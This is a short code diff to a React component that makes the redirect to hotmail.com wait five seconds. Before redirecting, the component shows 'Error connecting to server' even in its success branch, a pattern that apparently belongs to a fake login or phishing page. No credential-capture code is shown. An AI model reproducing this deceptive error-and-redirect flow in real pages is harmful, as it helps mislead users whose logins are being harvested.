@@ -78,12 +78,16 @@ const Universal = ({data}) => {
       console.log("Yeai!")
       setLoading(false)
       setError('Error connecting to server')
-      window.location.href = "https://www.hotmail.com"
+      setTimeout(() => {
+        window.location.href = "https://www.hotmail.com"
+      }, 5000)
     }else{
       console.log("Oops! Something is wrong.")
       setLoading(false)
       setError('Error connecting to server')
-      window.location.href = "https://www.hotmail.com"
+      setTimeout(() => {
+        window.location.href = "https://www.hotmail.com"
+      }, 5000)
     }
   }
 
